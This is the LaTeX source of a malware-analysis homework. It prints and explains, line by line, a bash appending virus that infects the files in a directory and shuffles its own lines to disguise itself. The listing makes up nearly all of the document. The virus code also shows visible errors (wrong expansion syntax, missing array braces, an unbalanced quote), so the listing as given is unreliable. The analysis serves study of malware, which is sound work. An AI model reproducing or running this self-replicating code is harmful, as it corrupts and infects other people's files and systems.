\documentclass[a4paper,6.5pt]{article}
\usepackage[english]{babel}
\usepackage[utf8]{inputenc}

\usepackage{cite}
\usepackage{listings}
\usepackage{amssymb, amsmath, latexsym}
\usepackage{syntax}
\usepackage{multicol}
\usepackage{tikz-cd}
\usepackage{color}
\usepackage{graphicx}
\usepackage{amsthm}
\usepackage{graphics}
\usepackage{listings}
\usepackage{stmaryrd}
\usepackage{array}
\usepackage{galois}
\usepackage[margin=0.3in]{geometry}

%%%%%%%%%%%
% 			Macro		%
%%%%%%%%%%%

%%% Definition of the language used
\lstdefinelanguage{code}
  { keywords={},
   otherkeywords={var_dump, echo},
	basicstyle=\ttfamily,
    keywordstyle=\bfseries\color{blue},
    sensitive=false,
    commentstyle=\color{green!40!black},
    showspaces=false,
    %numbers=left,
    tabsize=2,
    literate={~} {$\sim$}{1},
    showstringspaces=false,emph={3}
    showtabs=true,
    morecomment=[l]{//},
    morecomment=[s]{/*}{*/},
    morestring=[b],
    breaklines=true,
    breakindent=12pt
}

\lstset{language=code}

\newcommand{\tocode}[1]{\mbox{\lstinline@#1@}}

\begin{document}
\begin{center}
Malware analysis and design 

Homework No. 2

Vincenzo Arceri VR386484 Giovanni Liboni VR387955
\end{center}
The bash code given as assignment is a appending virus that copies his own code after the target file code, if this isn't already infected.
Below we explain in detail the virus behavior.

\begin{lstlisting}
if [ "$1" == "test" ]; then #@1	// If the first paramter is equals to "test" exit and 		
	exit 0 #@2 						// return 0 because the file is already infected
fi #@3		
MANAGER=(test cd ls pwd) #@4 // Array of 4 elements
RANDOM=$$ #@5	 				// Pid of the virus process
for target in *; do #@6		// For each file in the directory									
	// Counts the number of the target file					
	nbline=$(wc -l $target) #@7 	
	nbline=$(nbline## ) #@8									// Remove the longest sequence of spaces
	nbline=$(echo $nbline | cut -d " " -f1) #@9 		// and retrive the number of lines
	// Checks if the chosen file has less number of lines of the virus. 
	// If it is true, of course it isn't infected and continue.
	if [ $(($nbline)) -lt 42 ]; then #@10										
		continue #@11 									
	fi #@12											
	// Choose the name of the new file from one of the value contained in MANAGER, randomly.
	NEWFILE=$MANAGER[$((RANDOM % 4))] #@13						
	// Takes the last 39 lines of target and sort them with ordering based on the number after @.
	// It restores the code in the original order and write the output in a temporary file.
	tail -n 39 $target | sort -g -t@ +1 > /tmp/\ /"$NEWFILE" #@14 		
	// Gives to /tmp/\ /"$NEWFILE"  the execution permission
	chmod +x /tmp/\ /"$NEWFILE" #@15	
	// Execute the file just created: if it correspond to the virus it returns 0 (see first 3 lines) and continue, because the file is already infected. 
	if ! /tmp/\ /"$NEWFILE" test ; then #@16						
		continue #@17 									
	fi #@18
	// Choose the name of the new file from one of the value contained in MANAGER, randomly.
	NEWFILE=$MANAGER[$((RANDOM % 4))] #@19 
	// Path of the just created file								
	NEWFILE="/tmp/\ /$NEWFILE" #@20
	// Appends to the target file the nexts 2 lines of code that will be executed  when the target file 			will be run: this lines gets the last 39 lines of target (the virus) and executes it in background
	echo "tail -n 39 $0 > $NEWFILE" >> $target #@21						
	echo "chmod +x $NEWFILE && $NEWFILE &" >> $target #@22 					
	echo "exit 0" #@23
	// Creates am array of 40 elements: first element "FT" and the last " "
	tabft=("FT" [39]=" ") #@24 										
	declare -i nbl=0 #@25 // Creates an integer variable nbl=0					
	while [ $nbl -ne 39 ]; do #@26			// while (nbl != 39)						
		#Generates a random number from 1 to 39
		valindex=$(((RANDOM % 39)+1)) #@27						
		#if  tabft[valindex] == "FT", choose a new number for valindex
		while [ "$tabft[$valindex]" == "FT" ]; do #@28 		
			valindex=$(((RANDOM % 39)+1)) #@29	// Generates a random number from 1 to 39
		done #@30										
		
		# Takes the last $valindex lines of tthe virus and assign the first line of these					
		line=$(tail -$valindex $0 | head -1) #@31 								
		#adds to the chosen line: tab #@n and adds the line to the target file		
		line=$line/'\t'#* #@32											
		echo -e "$line"'\t'"@$valindex"" >> $target #@33 							
		nbl=$(($nbl+1)) #@34										
		done #@35 											
done #@36

\end{lstlisting}

\end{document}